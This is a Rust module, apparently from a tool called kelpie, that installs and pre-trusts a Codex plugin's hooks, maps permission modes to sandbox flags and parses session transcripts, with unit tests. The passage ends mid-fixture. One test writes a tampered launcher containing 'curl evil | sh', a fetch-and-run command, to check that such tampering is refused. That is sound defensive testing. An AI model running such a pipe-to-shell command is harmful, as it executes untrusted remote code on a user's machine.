use std::path::{Path, PathBuf};

use serde_json::{Value, json};
use sha2::{Digest, Sha256};

use super::claude::{Screens, Started};
use crate::profiles::Profile;
use crate::sh::Result;
use crate::tasks::Session;
use crate::typing::Draft;

pub const PLUGIN_ID: &str = "kelpie@kelpie";
const MARKETPLACE: &str = "kelpie";
const NAME: &str = "kelpie";
const MANIFEST: &str = ".codex-plugin/plugin.json";
const HOOKS_FILE: &str = "hooks/hooks.json";
const LAUNCHER: &str = "bin/kelpie-hook";
const HOOK_TIMEOUT: u64 = 30;
const DEFAULT_CONTEXT_LIMIT: u64 = 2500;
pub const TASK_VAR: &str = "KELPIE_ADDRESS";

struct Hook {
    event: &'static str,
    label: &'static str,
    arg: &'static str,
    context_limit: Option<u64>,
}

// The role arrives as SessionStart context, so its limit is 0: Codex would otherwise spill a long role to a file and show the model a preview.
const HOOKS: [Hook; 3] = [
    Hook { event: "SessionStart", label: "session_start", arg: "session-start", context_limit: Some(0) },
    Hook { event: "UserPromptSubmit", label: "user_prompt_submit", arg: "prompt", context_limit: None },
    Hook { event: "Stop", label: "stop", arg: "stop", context_limit: None },
];

pub fn home() -> Option<PathBuf> {
    std::env::var("CODEX_HOME").ok().filter(|dir| !dir.is_empty()).map(PathBuf::from).or_else(|| std::env::var("HOME").ok().map(|home| Path::new(&home).join(".codex")))
}

// Codex loads an enabled plugin from its cache at <marketplace>/<plugin>/<version>, and "local" wins over any other version there.
pub fn plugin_root(home: &Path) -> PathBuf {
    home.join("plugins/cache").join(MARKETPLACE).join(NAME).join("local")
}

fn handler(hook: &Hook) -> Value {
    let mut handler = json!({ "type": "command", "command": format!("\"${{PLUGIN_ROOT}}/{LAUNCHER}\" {}", hook.arg), "timeout": HOOK_TIMEOUT });
    if let Some(limit) = hook.context_limit {
        handler["additionalContextLimit"] = json!(limit);
    }
    handler
}

pub fn hooks_json() -> String {
    let hooks: serde_json::Map<String, Value> = HOOKS.iter().map(|hook| (hook.event.to_string(), json!([{ "hooks": [handler(hook)] }]))).collect();
    serde_json::to_string_pretty(&json!({ "description": "kelpie's hooks for the Codex sessions it runs as tasks", "hooks": hooks })).unwrap_or_default() + "\n"
}

// Codex names a plugin hook's trust entry <plugin id>:<file in the plugin>:<event>:<group>:<handler>.
fn hook_key(hook: &Hook) -> String {
    format!("{PLUGIN_ID}:{HOOKS_FILE}:{}:0:0", hook.label)
}

// Codex 0.163's hook_hash: the event's label and the group with its one normalized handler, as JSON with sorted keys, under SHA-256.
fn hook_hash(hook: &Hook) -> String {
    let mut normalized = json!({ "type": "command", "command": handler(hook)["command"], "timeout": HOOK_TIMEOUT, "async": false });
    if let Some(limit) = hook.context_limit.filter(|limit| *limit != DEFAULT_CONTEXT_LIMIT) {
        normalized["additionalContextLimit"] = json!(limit);
    }
    sha256_version(&json!({ "event_name": hook.label, "hooks": [normalized] }))
}

fn sha256_version(value: &Value) -> String {
    let digest = Sha256::digest(serde_json::to_vec(value).unwrap_or_default());
    format!("sha256:{}", digest.iter().map(|byte| format!("{byte:02x}")).collect::<String>())
}

fn toml_string(text: &str) -> String {
    let mut quoted = String::from("\"");
    for character in text.chars() {
        match character {
            '"' => quoted.push_str("\\\""),
            '\\' => quoted.push_str("\\\\"),
            '\n' => quoted.push_str("\\n"),
            '\t' => quoted.push_str("\\t"),
            '\r' => quoted.push_str("\\r"),
            character if character.is_control() => quoted.push_str(&format!("\\u{:04X}", character as u32)),
            character => quoted.push(character),
        }
    }
    quoted.push('"');
    quoted
}

// A -c key is split on every dot, so the trust entries, whose keys hold "hooks.json", go in as one inline table.
pub fn trust_override() -> String {
    let entries: Vec<String> = HOOKS.iter().map(|hook| format!("{}={{trusted_hash={}}}", toml_string(&hook_key(hook)), toml_string(&hook_hash(hook)))).collect();
    format!("hooks.state={{{}}}", entries.join(","))
}

pub fn enable_override() -> String {
    format!("plugins.{PLUGIN_ID}.enabled=true")
}

fn launcher(kelpie: &str) -> String {
    format!("#!/bin/sh\nkelpie={}\n[ -x \"$kelpie\" ] || exit 0\nexec \"$kelpie\" hook codex \"$@\"\n", crate::sh::quote(kelpie))
}

fn manifest() -> String {
    serde_json::to_string_pretty(&json!({ "name": NAME, "version": env!("CARGO_PKG_VERSION"), "description": "kelpie's hooks for the Codex sessions it runs as tasks: it records the session, gives it its role, and asks for a report before a turn ends" })).unwrap_or_default() + "\n"
}

fn plugin_files(kelpie: &str) -> [(&'static str, String, bool); 3] {
    [(MANIFEST, manifest(), false), (HOOKS_FILE, hooks_json(), false), (LAUNCHER, launcher(kelpie), true)]
}

#[derive(Debug, PartialEq)]
pub enum Installed {
    Missing,
    Current,
    Stale(Vec<&'static str>),
}

pub fn installed(home: &Path, kelpie: &str) -> Installed {
    let root = plugin_root(home);
    if !root.join(HOOKS_FILE).is_file() {
        return Installed::Missing;
    }
    let stale: Vec<&'static str> = plugin_files(kelpie).into_iter().filter(|(file, text, _)| std::fs::read_to_string(root.join(file)).ok().as_deref() != Some(text.as_str())).map(|(file, _, _)| file).collect();
    if stale.is_empty() { Installed::Current } else { Installed::Stale(stale) }
}

fn write_file(path: &Path, text: &str, executable: bool) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;
    let dir = path.parent().ok_or_else(|| format!("{} has no folder", path.display()))?;
    std::fs::create_dir_all(dir).map_err(|error| format!("{}: {error}", dir.display()))?;
    let temp = dir.join(format!(".{}.{}.tmp", path.file_name().unwrap_or_default().to_string_lossy(), std::process::id()));
    std::fs::write(&temp, text).map_err(|error| format!("{}: {error}", temp.display()))?;
    std::fs::set_permissions(&temp, std::fs::Permissions::from_mode(if executable { 0o755 } else { 0o644 })).map_err(|error| format!("{}: {error}", temp.display()))?;
    std::fs::rename(&temp, path).map_err(|error| format!("{}: {error}", path.display()))
}

// Trust covers the hooks' command line, never the launcher it runs, so a task starts only on the plugin exactly as this kelpie writes it.
pub fn ready_to_start(home: Option<&Path>, kelpie: &str) -> Result<()> {
    let home = home.ok_or("Neither CODEX_HOME nor HOME is set, so kelpie cannot find Codex's home")?;
    match installed(home, kelpie) {
        Installed::Current => Ok(()),
        Installed::Missing => Err(format!("kelpie's Codex plugin is not installed in {}, so the task would neither report nor get its role; run kelpie setup codex", plugin_root(home).display())),
        Installed::Stale(files) => Err(format!("kelpie's Codex plugin in {} is not what this kelpie writes ({}); run kelpie setup codex", plugin_root(home).display(), files.join(", "))),
    }
}

// Only kelpie's own folder in Codex's plugin cache is written; Codex's config.toml and hooks.json stay the user's.
pub fn install(home: &Path, kelpie: &str) -> Result<Vec<PathBuf>> {
    let root = plugin_root(home);
    let mut written = Vec::new();
    for (file, text, executable) in plugin_files(kelpie) {
        let path = root.join(file);
        if std::fs::read_to_string(&path).ok().as_deref() != Some(text.as_str()) {
            write_file(&path, &text, executable)?;
            written.push(path);
        }
    }
    Ok(written)
}

pub fn uninstall(home: &Path) -> Result<bool> {
    let root = plugin_root(home);
    if !root.exists() {
        return Ok(false);
    }
    std::fs::remove_dir_all(&root).map_err(|error| format!("{}: {error}", root.display()))?;
    for dir in root.ancestors().skip(1).take(2) {
        if std::fs::remove_dir(dir).is_err() {
            break;
        }
    }
    Ok(true)
}

// kelpie's plugin runs only in the sessions kelpie starts: enabled, and its three hooks trusted by hash, for that invocation alone.
pub fn plugin_args() -> [String; 4] {
    ["-c".to_string(), enable_override(), "-c".to_string(), trust_override()]
}

fn access(mode: Option<&str>, sandboxed: bool) -> Vec<String> {
    let words: &[&str] = match (mode, sandboxed) {
        (Some("plan"), _) => &["--sandbox", "read-only", "--ask-for-approval", "on-request"],
        (Some("auto"), true) => &["--approve-for-me"],
        (Some("bypassPermissions" | "dontAsk"), true) => &["--sandbox", "workspace-write", "--ask-for-approval", "never"],
        (_, true) => &["--sandbox", "workspace-write", "--ask-for-approval", "on-request"],
        (Some("bypassPermissions"), false) => &["--dangerously-bypass-approvals-and-sandbox"],
        (Some("dontAsk"), false) => &["--ask-for-approval", "never"],
        (Some("auto"), false) => &["--ask-for-approval", "on-request", "-c", "approvals_reviewer=\"auto_review\""],
        (_, false) => &[],
    };
    words.iter().map(|word| word.to_string()).collect()
}

// The commands Codex runs get the push block and the task's address, which also names the task to kelpie's caller check.
fn env_override(address: &str, tmp: Option<&Path>) -> String {
    let mut set = vec![("GIT_CONFIG_COUNT", "1".to_string()), ("GIT_CONFIG_KEY_0", "url.kelpie-blocks-push:.pushInsteadOf".to_string()), ("GIT_CONFIG_VALUE_0", String::new()), (TASK_VAR, address.to_string())];
    if let Some(tmp) = tmp {
        set.push(("TMPDIR", tmp.to_string_lossy().to_string()));
    }
    format!("shell_environment_policy.set={{{}}}", set.iter().map(|(name, value)| format!("{name}={}", toml_string(value))).collect::<Vec<_>>().join(","))
}

// Codex picks a new session's id itself, so a new start names none and the SessionStart hook records it; a resume is the resume subcommand with the id last.
pub(crate) fn start_args(mode: Option<&str>, profile: &Profile, address: &str, sandboxed: bool, tmp: Option<&Path>, session: &Session) -> Vec<String> {
    let mut args = Vec::new();
    if let Session::Resume(_) = session {
        args.push("resume".to_string());
    }
    args.extend(access(mode, sandboxed));
    if let Some(model) = &profile.model {
        args.extend(["--model".to_string(), model.clone()]);
    }
    if let Some(effort) = &profile.effort {
        args.extend(["-c".to_string(), format!("model_reasoning_effort={}", toml_string(effort))]);
    }
    args.extend(["-c".to_string(), env_override(address, tmp)]);
    args.extend(plugin_args());
    if let Session::Resume(id) = session {
        args.push(id.clone());
    }
    args
}

const SWITCHES: [&str; 8] = ["--approve-for-me", "--dangerously-bypass-approvals-and-sandbox", "--dangerously-bypass-hook-trust", "--search", "--no-alt-screen", "--oss", "--strict-config", "--no-daemon"];
const VALUES: [&str; 18] = ["-c", "--config", "-m", "--model", "-s", "--sandbox", "-a", "--ask-for-approval", "-p", "--profile", "--enable", "--disable", "-C", "--cd", "--add-dir", "--local-provider", "--remote", "--remote-auth-token-env"];
const REFUSED: [&str; 6] = ["-h", "--help", "-V", "--version", "-i", "--image"];
const DROPPED: [&str; 3] = ["--last", "--all", "--include-non-interactive"];

fn base(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

// The process's own flags, without its subcommand, session and prompt, then resume <flags> <session>; an option kelpie cannot place is refused, since its next word could be a prompt.
pub fn resume_args(argv: &[String], session: &str) -> std::result::Result<Vec<String>, String> {
    let start = match argv {
        [program, ..] if base(program) == "codex" => 1,
        [program, script, ..] if base(program).starts_with("node") && script.contains("codex") => 2,
        [] => return Err("its command line is empty".to_string()),
        [program, ..] => return Err(format!("its command is {}, not codex", base(program))),
    };
    let mut kept = vec!["resume".to_string()];
    let mut words = argv[start..].iter();
    while let Some(word) = words.next() {
        if word == "--" {
            break;
        }
        if !word.starts_with('-') {
            continue;
        }
        let flag = word.split_once('=').map_or(word.as_str(), |(flag, _)| flag);
        if REFUSED.contains(&flag) {
            return Err(format!("it runs with {flag}, which a resumed session cannot keep"));
        }
        if DROPPED.contains(&flag) {
            continue;
        }
        kept.push(word.clone());
        if SWITCHES.contains(&flag) || flag.len() < word.len() {
            continue;
        }
        if !VALUES.contains(&flag) {
            return Err(format!("it runs with {flag}, an option kelpie does not know"));
        }
        kept.push(words.next().ok_or(format!("its {flag} has no value"))?.clone());
    }
    kept.push(session.to_string());
    Ok(kept)
}

fn has_config(args: &[String], value: &str) -> bool {
    args.windows(2).any(|pair| (pair[0] == "-c" || pair[0] == "--config") && pair[1] == value)
}

// A task's Codex without kelpie's plugin enabled and trusted runs none of its hooks, so it never reports.
pub fn lacks_role(argv: &[String]) -> bool {
    !has_config(argv, &enable_override()) || !has_config(argv, &trust_override())
}

pub fn with_role(args: &[String]) -> Vec<String> {
    let mut kept = Vec::new();
    let mut words = args.iter().peekable();
    while let Some(word) = words.next() {
        let ours = |value: &String| value == &enable_override() || value.starts_with("hooks.state=");
        if (word == "-c" || word == "--config") && words.peek().is_some_and(|value| ours(value)) {
            words.next();
        } else {
            kept.push(word.clone());
        }
    }
    let at = if kept.first().is_some_and(|word| word == "resume") { kept.len().saturating_sub(1).max(1) } else { kept.len() };
    kept.splice(at..at, plugin_args());
    kept
}

fn rollouts(home: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    let mut dirs = vec![home.join("sessions")];
    while let Some(dir) = dirs.pop() {
        for entry in std::fs::read_dir(&dir).into_iter().flatten().flatten() {
            let path = entry.path();
            if path.is_dir() {
                dirs.push(path);
            } else if path.file_name().and_then(|name| name.to_str()).is_some_and(|name| name.starts_with("rollout-") && (name.ends_with(".jsonl") || name.ends_with(COMPRESSED))) {
                found.push(path);
            }
        }
    }
    found
}

const COMPRESSED: &str = ".jsonl.zst";

// Codex 0.163 writes a session to sessions/YYYY/MM/DD/rollout-<local time>-<session id>.jsonl under its home, and may compress one idle for a week to .jsonl.zst, which it still resumes.
pub fn transcript(home: &Path, session: &str) -> Option<PathBuf> {
    let found = rollouts(home);
    let named = |suffix: String| found.iter().find(|path| path.file_name().and_then(|name| name.to_str()).is_some_and(|name| name.ends_with(&suffix))).cloned();
    named(format!("-{session}.jsonl")).or_else(|| named(format!("-{session}{COMPRESSED}")))
}

// kelpie reads no compressed rollout, so what such a session heard is unknown rather than nothing.
pub fn compressed(path: &Path) -> bool {
    path.to_string_lossy().ends_with(COMPRESSED)
}

fn meta(path: &Path) -> Option<Value> {
    use std::io::BufRead;
    let file = std::fs::File::open(path).ok()?;
    let first = std::io::BufReader::new(file).lines().next()?.ok()?;
    let line: Value = serde_json::from_str(&first).ok()?;
    (line["type"] == "session_meta").then(|| line["payload"].clone())
}

// The newest conversation Codex began in this folder since the given time, by the session_meta line each rollout opens with.
pub fn latest_session(home: &Path, folder: &Path, since: std::time::SystemTime) -> Option<String> {
    rollouts(home).into_iter()
        .filter_map(|path| Some((std::fs::metadata(&path).ok()?.modified().ok()?, path)))
        .filter(|(modified, _)| *modified >= since)
        .filter_map(|(modified, path)| {
            let meta = meta(&path)?;
            let cwd = meta["cwd"].as_str().map(PathBuf::from)?;
            (cwd == folder).then(|| Some((modified, meta["id"].as_str()?.to_string()))).flatten()
        })
        .max_by_key(|(modified, _)| *modified)
        .map(|(_, id)| id)
}

// One user turn in a rollout: event_msg user_message in Codex's legacy history, item_completed with a UserMessage item in its paginated one.
pub(crate) fn user_text(line: &Value) -> Option<String> {
    if line["type"] != "event_msg" {
        return None;
    }
    let payload = &line["payload"];
    match payload["type"].as_str()? {
        "user_message" => payload["message"].as_str().map(str::to_string),
        "item_completed" if payload["item"]["type"] == "UserMessage" => {
            let parts: Vec<&str> = payload["item"]["content"].as_array()?.iter().filter(|part| part["type"] == "text").filter_map(|part| part["text"].as_str()).collect();
            (!parts.is_empty()).then(|| parts.join("\n"))
        }
        _ => None,
    }
}

pub fn user_messages_at(transcript: &str) -> Vec<(Option<u64>, String)> {
    transcript.lines().filter_map(|line| serde_json::from_str::<Value>(line).ok())
        .filter_map(|line| Some((line["timestamp"].as_str().and_then(crate::typing::iso_millis), user_text(&line)?.trim().to_string())))
        .filter(|(_, text)| !text.is_empty() && !text.starts_with('<'))
        .collect()
}

// Codex's composer is the last line that opens with its › prompt; what it shows faint is its placeholder, never a draft.
pub fn draft(screen: &str) -> Draft {
    let styled: Vec<crate::typing::Styled> = screen.lines().map(crate::typing::styled).collect();
    let Some(prompt) = styled.iter().rposition(|line| line.text.trim_start().starts_with('›')) else { return Draft::Unreadable };
    let end = (prompt + 1..styled.len()).find(|&at| styled[at].text.trim().is_empty()).unwrap_or(styled.len());
    let lines = &styled[prompt..end];
    let first = lines[0].text.trim_start().trim_start_matches('›').trim().to_string();
    let text: Vec<String> = std::iter::once(first).chain(lines[1..].iter().map(|line| line.text.trim().to_string())).filter(|line| !line.is_empty()).collect();
    if text.is_empty() || crate::typing::suggested(lines, &['›']) {
        return Draft::Empty;
    }
    Draft::Typed(text.join("\n"))
}

// Codex's own record of the folders the user trusted, in its config.toml's [projects] table; read, never written.
pub fn trusted_by_user(dir: &Path) -> bool {
    let config = home().and_then(|home| std::fs::read_to_string(home.join("config.toml")).ok()).and_then(|text| text.parse::<toml::Table>().ok());
    config.is_some_and(|config| trusted_in(&config, dir))
}

fn trusted_in(config: &toml::Table, dir: &Path) -> bool {
    let projects = config.get("projects").and_then(toml::Value::as_table);
    dir.ancestors().any(|folder| folder.to_str().and_then(|folder| projects?.get(folder)?.get("trust_level")?.as_str()) == Some("trusted"))
}

// Codex asks once per folder whether to trust it, with "Trust and continue" first.
pub(crate) fn asks_trust(screen: &str) -> bool {
    screen.contains("Trust this folder?") && screen.contains("Trust and continue")
}

// Codex lists other hooks it has not been told to trust before it runs; they are the user's, so kelpie answers nothing there.
pub(crate) fn asks_hooks(screen: &str) -> bool {
    screen.contains("Hooks need review") && screen.contains("Continue without trusting")
}

pub(crate) fn trust_selected(screen: &str) -> bool {
    screen.lines().any(|line| line.trim_start().starts_with('›') && line.contains("Trust and continue"))
}

pub(crate) const SCREENS: Screens = Screens { kind: "codex", name: "Codex", asks_trust, trust_selected, toward_trust: "up", held: |screen| asks_hooks(screen).then_some(Started::AwaitsHooks), running: |_| Started::Ready };

pub fn start(name: &str, pane: &str, args: &[&str], trusted: bool) -> Result<Started> {
    super::claude::start_with(&SCREENS, name, pane, args, trusted)
}

pub fn end(pane: &str) -> Result<()> {
    super::claude::end_agent("Codex", pane)
}

// kelpie's Codex hooks, run by the plugin's launcher: outside a kelpie task's worktree each is silent.
pub fn hook(input: &str) -> String {
    let value: Value = serde_json::from_str(input).unwrap_or_default();
    let cwd = value["cwd"].as_str().map(PathBuf::from).or_else(|| std::env::current_dir().ok());
    let Some(me) = cwd.and_then(|cwd| crate::peers::me(&cwd)).filter(|me| me != crate::status::LEAD_LABEL) else { return String::new() };
    match value["hook_event_name"].as_str() {
        Some("SessionStart") => session_start(&me, &value, crate::lead::roles_dir().ok().as_deref()),
        Some("UserPromptSubmit" | "Stop") => {
            let _ = crate::messages::flush();
            crate::report::hook(input)
        }
        _ => String::new(),
    }
}

fn session_start(me: &str, input: &Value, roles: Option<&Path>) -> String {
    if let Some(session) = input["session_id"].as_str().filter(|id| !id.is_empty()) {
        let _ = crate::tasks::record_session(me, session);
    }
    let Some(role) = roles.and_then(|dir| std::fs::read_to_string(dir.join(format!("{me}.md"))).ok()).filter(|role| !role.trim().is_empty()) else { return String::new() };
    json!({ "hookSpecificOutput": { "hookEventName": "SessionStart", "additionalContext": role } }).to_string()
}

#[derive(Debug, PartialEq)]
pub struct Availability {
    pub binary: Option<PathBuf>,
    pub version: Option<String>,
    pub plugin: Installed,
}

pub fn availability(path: &[PathBuf], home: Option<&Path>, kelpie: &str) -> Availability {
    let binary = crate::doctor::which("codex", path);
    let version = binary.as_ref().and_then(|binary| crate::sh::run(&binary.to_string_lossy(), &["--version"], None).ok()).map(|text| text.trim().to_string());
    Availability { binary, version, plugin: home.map_or(Installed::Missing, |home| installed(home, kelpie)) }
}

impl Availability {
    pub fn line(&self) -> String {
        let binary = match (&self.binary, &self.version) {
            (Some(binary), Some(version)) => format!("{version} at {}", binary.display()),
            (Some(binary), None) => format!("{} (its version does not read)", binary.display()),
            (None, _) => "codex is not on PATH".to_string(),
        };
        let plugin = match &self.plugin {
            Installed::Current => "kelpie's plugin installed".to_string(),
            Installed::Missing => "kelpie's plugin not installed: kelpie setup codex".to_string(),
            Installed::Stale(_) => "kelpie's plugin out of date: kelpie setup codex".to_string(),
        };
        format!("{binary} · {plugin}")
    }
}

// What in the user's own Codex config keeps kelpie's hooks from running, read only: hooks turned off, or one of kelpie's turned off in /hooks.
pub fn hooks_blocked(config: Option<&toml::Table>) -> Vec<String> {
    let Some(config) = config else { return Vec::new() };
    let mut blocked = Vec::new();
    if config.get("features").and_then(|features| features.get("hooks").or_else(|| features.get("codex_hooks"))).and_then(toml::Value::as_bool) == Some(false) {
        blocked.push("[features] hooks = false turns every hook off".to_string());
    }
    let state = config.get("hooks").and_then(|hooks| hooks.get("state")).and_then(toml::Value::as_table);
    for hook in &HOOKS {
        if state.and_then(|state| state.get(&hook_key(hook))).and_then(|entry| entry.get("enabled")).and_then(toml::Value::as_bool) == Some(false) {
            blocked.push(format!("its {} hook is turned off in /hooks", hook.event));
        }
    }
    blocked
}

#[cfg(test)]
mod tests {
    use super::*;

    fn profile(model: Option<&str>, effort: Option<&str>) -> Profile {
        Profile { agent: super::super::Agent::Codex, model: model.map(str::to_string), effort: effort.map(str::to_string), ..crate::profiles::built_in(crate::profiles::TASK).unwrap() }
    }

    fn after<'a>(args: &'a [String], flag: &str) -> Vec<&'a str> {
        args.windows(2).filter(|pair| pair[0] == flag).map(|pair| pair[1].as_str()).collect()
    }

    #[test]
    fn a_sandboxed_codex_task_writes_only_its_workspace_and_asks_before_leaving_it() {
        let args = start_args(None, &profile(Some("gpt-5.5"), Some("high")), "billing@app", true, Some(Path::new("/src/app/.git/worktrees/1/kelpie-tmp")), &Session::New("ignored".to_string()));
        assert_eq!(after(&args, "--sandbox"), ["workspace-write"]);
        assert_eq!(after(&args, "--ask-for-approval"), ["on-request"]);
        assert_eq!(after(&args, "--model"), ["gpt-5.5"]);
        let config = after(&args, "-c");
        assert!(config.contains(&"model_reasoning_effort=\"high\""), "{config:?}");
        assert!(config.contains(&"shell_environment_policy.set={GIT_CONFIG_COUNT=\"1\",GIT_CONFIG_KEY_0=\"url.kelpie-blocks-push:.pushInsteadOf\",GIT_CONFIG_VALUE_0=\"\",KELPIE_ADDRESS=\"billing@app\",TMPDIR=\"/src/app/.git/worktrees/1/kelpie-tmp\"}"), "the push block reaches every command it runs: {config:?}");
        assert!(config.contains(&"plugins.kelpie@kelpie.enabled=true") && config.iter().any(|value| value.starts_with("hooks.state={\"kelpie@kelpie:hooks/hooks.json:session_start:0:0\"={trusted_hash=\"sha256:")), "{config:?}");
        assert!(!args.iter().any(|word| word.contains("ignored")), "Codex picks a new session's id itself");
        assert!(!args.iter().any(|word| word.starts_with("--dangerously")), "{args:?}");
    }

    #[test]
    fn the_permission_mode_maps_to_codexs_approvals_inside_and_outside_its_sandbox() {
        let run = |mode: Option<&str>, sandboxed: bool| access(mode, sandboxed).join(" ");
        assert_eq!(run(Some("bypassPermissions"), true), "--sandbox workspace-write --ask-for-approval never", "nothing leaves the sandbox, as Claude's allowUnsandboxedCommands = false");
        assert_eq!(run(Some("dontAsk"), true), "--sandbox workspace-write --ask-for-approval never");
        assert_eq!(run(Some("auto"), true), "--approve-for-me", "only auto lets Codex's own reviewer approve a step out of the sandbox");
        assert_eq!(run(None, true), "--sandbox workspace-write --ask-for-approval on-request");
        assert_eq!(run(Some("default"), true), run(None, true));
        assert_eq!(run(Some("acceptEdits"), true), "--sandbox workspace-write --ask-for-approval on-request");
        assert_eq!(run(Some("plan"), true), "--sandbox read-only --ask-for-approval on-request");
        assert_eq!(run(Some("plan"), false), "--sandbox read-only --ask-for-approval on-request");
        assert_eq!(run(Some("bypassPermissions"), false), "--dangerously-bypass-approvals-and-sandbox", "only with the sandbox turned off");
        assert_eq!(run(Some("dontAsk"), false), "--ask-for-approval never");
        assert_eq!(run(None, false), "", "the user's own Codex config decides");
    }

    #[test]
    fn a_resumed_codex_task_names_its_session_last_after_the_resume_subcommand() {
        let args = start_args(Some("default"), &profile(None, None), "billing@app", true, None, &Session::Resume("019b3136-fdf0-7d50-8762-84076af7f203".to_string()));
        assert_eq!(args.first().map(String::as_str), Some("resume"));
        assert_eq!(args.last().map(String::as_str), Some("019b3136-fdf0-7d50-8762-84076af7f203"));
        assert!(!args.iter().any(|word| word.starts_with("model_reasoning_effort") || word == "--model"), "no model or effort the profile did not name");
    }

    #[test]
    fn the_hash_kelpie_trusts_is_codexs_own_for_each_hook() {
        let rows: Value = serde_json::from_str(r#"{"nested":{"a":true,"z":"text"},"rows":[{"a":1,"z":2},{"a":3,"z":4}]}"#).unwrap();
        assert_eq!(sha256_version(&rows), "sha256:a5e4c8fbdbc75d185b0f2b5291bfb2de10e8c523d6c89248876fd78a97c83176", "codex-rs/config/src/fingerprint_tests.rs at rust-v0.163.0");
        let file: Value = serde_json::from_str(&hooks_json()).unwrap();
        for hook in &HOOKS {
            let written = &file["hooks"][hook.event][0]["hooks"][0];
            assert_eq!(written, &handler(hook), "{}", hook.event);
        }
        assert_eq!(file["hooks"]["SessionStart"][0]["hooks"][0]["additionalContextLimit"], json!(0), "a long role is passed whole");
        assert_eq!(hook_key(&HOOKS[2]), "kelpie@kelpie:hooks/hooks.json:stop:0:0");
        let reported = ["sha256:93a229e7e2460908b605aa36f06366d7392e5d449eb06968203806099117bd2f", "sha256:450757c409da7941a5f499348566fab0f3e9731db7de75ef330eb9b16f6ac956", "sha256:45072b9c5653a2cdbbb5776a290a821d5d7764ab82356761127ef63f065ec873"];
        assert_eq!(HOOKS.iter().map(hook_hash).collect::<Vec<_>>(), reported, "the currentHash codex app-server 0.163.0 reports in hooks/list for these hooks; a change to a hook changes it, and kelpie's override with it");
        assert!(trust_override().starts_with("hooks.state={\"kelpie@kelpie:hooks/hooks.json:session_start:0:0\"={trusted_hash=\"sha256:"));
        let parsed: toml::Table = trust_override().replacen("hooks.state=", "state = ", 1).parse().unwrap();
        assert_eq!(parsed["state"].as_table().unwrap().len(), 3, "the override parses as TOML with all three entries");
    }

    #[test]
    fn the_hooks_file_never_changes_with_kelpies_path_so_its_trust_holds_across_updates() {
        assert_eq!(hooks_json(), hooks_json());
        let file: Value = serde_json::from_str(&hooks_json()).unwrap();
        assert_eq!(file["hooks"]["Stop"][0]["hooks"][0]["command"], "\"${PLUGIN_ROOT}/bin/kelpie-hook\" stop", "the launcher in the plugin, which knows where kelpie is");
        assert!(launcher("/opt/kelpie/kelpie").contains("kelpie='/opt/kelpie/kelpie'\n[ -x \"$kelpie\" ] || exit 0\nexec \"$kelpie\" hook codex \"$@\""));
    }

    #[test]
    fn setup_writes_kelpies_plugin_into_codexs_cache_once_and_never_the_users_own_files() {
        let home = crate::sh::test_dir("codex-home");
        std::fs::write(home.join("config.toml"), "model = \"gpt-5.5\"\n").unwrap();
        std::fs::write(home.join("hooks.json"), "{\"hooks\":{}}").unwrap();
        assert_eq!(installed(&home, "/opt/kelpie"), Installed::Missing);
        let written = install(&home, "/opt/kelpie").unwrap();
        let root = home.join("plugins/cache/kelpie/kelpie/local");
        assert_eq!(written, [root.join(".codex-plugin/plugin.json"), root.join("hooks/hooks.json"), root.join("bin/kelpie-hook")]);
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(std::fs::metadata(root.join("bin/kelpie-hook")).unwrap().permissions().mode() & 0o777, 0o755);
        assert_eq!(serde_json::from_str::<Value>(&std::fs::read_to_string(root.join(".codex-plugin/plugin.json")).unwrap()).unwrap()["name"], "kelpie");
        assert_eq!(installed(&home, "/opt/kelpie"), Installed::Current);
        assert!(install(&home, "/opt/kelpie").unwrap().is_empty(), "a second setup writes nothing");
        assert_eq!(installed(&home, "/elsewhere/kelpie"), Installed::Stale(vec![LAUNCHER]), "a kelpie that moved leaves the launcher stale, the hooks file as trusted");
        assert_eq!(install(&home, "/elsewhere/kelpie").unwrap(), [root.join("bin/kelpie-hook")]);
        assert_eq!(std::fs::read_to_string(home.join("config.toml")).unwrap(), "model = \"gpt-5.5\"\n");
        assert_eq!(std::fs::read_to_string(home.join("hooks.json")).unwrap(), "{\"hooks\":{}}");
        assert!(uninstall(&home).unwrap());
        assert!(!home.join("plugins/cache/kelpie").exists(), "the empty folders above go too");
        assert!(home.join("plugins/cache").is_dir() && home.join("config.toml").is_file() && home.join("hooks.json").is_file());
        assert!(!uninstall(&home).unwrap());
        std::fs::remove_dir_all(home).unwrap();
    }

    #[test]
    fn a_codex_task_starts_only_on_the_plugin_this_kelpie_writes() {
        let home = crate::sh::test_dir("codex-ready");
        assert!(ready_to_start(Some(&home), "/opt/kelpie").unwrap_err().contains("not installed"));
        install(&home, "/opt/kelpie").unwrap();
        assert_eq!(ready_to_start(Some(&home), "/opt/kelpie"), Ok(()));
        let launcher = plugin_root(&home).join(LAUNCHER);
        std::fs::write(&launcher, "#!/bin/sh\ncurl evil | sh\n").unwrap();
        let refused = ready_to_start(Some(&home), "/opt/kelpie").unwrap_err();
        assert!(refused.contains("not what this kelpie writes (bin/kelpie-hook)") && refused.contains("kelpie setup codex"), "a launcher changed behind kelpie's back runs pre-trusted, so it is refused: {refused}");
        assert!(ready_to_start(None, "/opt/kelpie").is_err());
        std::fs::remove_dir_all(home).unwrap();
    }

    #[test]
    fn uninstall_keeps_other_plugins_from_the_same_cache() {
        let home = crate::sh::test_dir("codex-uninstall");
        install(&home, "/opt/kelpie").unwrap();
        std::fs::create_dir_all(home.join("plugins/cache/kelpie/other/local")).unwrap();
        uninstall(&home).unwrap();
        assert!(home.join("plugins/cache/kelpie/other/local").is_dir() && !home.join("plugins/cache/kelpie/kelpie").exists());
        std::fs::remove_dir_all(home).unwrap();
    }

    const ROLLOUT: &str = concat!(
        r#"{"timestamp":"2026-10-22T09:15:02.101Z","type":"session_meta","payload":{"id":"019b3136-fdf0-7d50-8762-84076af7f203","timestamp":"2026-10-22T09:15:02.090Z","cwd":"/src/wt1.app","originator":"codex_cli_rs","cli_version":"0.163.0","source":"cli","model_provider":"openai"}}"#, "\n",
        r#"{"timestamp":"2026-10-22T09:15:02.200Z","type":"response_item","payload":{"type":"message","role":"user","content":[{"type":"input_text","text":"<environment_context>\n  <cwd>/src/wt1.app</cwd>\n</environment_context>"}]}}"#, "\n",
        r#"{"timestamp":"2026-10-22T09:15:03.000Z","type":"event_msg","payload":{"type":"user_message","message":"add refunds to the billing page","images":[]}}"#, "\n",
        r#"{"timestamp":"2026-10-22T09:15:09.500Z","type":"event_msg","payload":{"type":"agent_message","message":"Done."}}"#, "\n",
